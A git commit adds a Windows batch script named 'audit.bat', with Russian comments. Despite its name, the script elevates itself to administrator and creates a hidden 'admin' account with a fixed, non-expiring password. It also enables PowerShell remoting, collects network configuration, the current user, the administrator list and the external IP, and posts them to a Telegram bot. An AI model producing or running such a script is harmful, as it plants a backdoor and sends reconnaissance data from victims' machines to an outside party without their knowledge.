3204b2dc6e61d86176091fc582abc64c00c980e7
Александр <logovopost@yandex.ru>
2025-07-05 22:16:10 +0300

    Update and rename bat1.bat to audit.bat

---
+++ audit.bat
@@ -0,0 +1,56 @@
+@echo off
+
+chcp 65001
+setlocal enabledelayedexpansion
+
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+ 
+chcp 65001
+net user /add admin passwd
+net localgroup Администраторы admin /add
+net localgroup Пользователи admin /del
+wmic useraccount where "name='admin'" set passwordexpires=false
+
+
+:: Получаем IP компьютера
+for /f "skip=4 delims=" %%A in ('ipconfig /all') do (
+    set "ip=!ip!%%A, "
+)
+
+:: Получаем пользователя, от имени которого выполнили скрипт.
+for /f "delims=" %%A in ('whoami') do (
+    set "user=!user!%%A, "
+)
+
+:: Получаем пользователей в группе "Администраторы"
+for /f "skip=4 delims=" %%A in ('net localgroup "Администраторы"') do (
+    set "adminUsers=!adminUsers!%%A, "
+)
+
+
+:: Выполнение команды PowerShell Enable-PSRemoting
+powershell -Command "Enable-PSRemoting -Force"
+
+:: Проверка успешности выполнения
+if %errorlevel% equ 0 (
+    set "WinRM=PSRemoting успешно включен."
+) else (
+    set "WinRM=Ошибка при включении PSRemoting."
+)
+
+:: Получаем внешний IP с помощью curl и записываем в переменную
+for /f "tokens=*" %%a in ('curl -s http://ifconfig.me') do set "externalIP=%%a"
+
+set "extip=    Внешний IP: !externalIP!"
+
+set msg=!ip!!user!!adminUsers!!WinRM!!extip!
+call :myFunction
+endlocal
+exit /b
+
+:myFunction
+set TOKEN=""
+set CHAT_ID="-100"
+
+curl -X POST "https://api.telegram.org/bot!TOKEN!/sendMessage" -d "chat_id=!CHAT_ID!&text=!msg!"
+
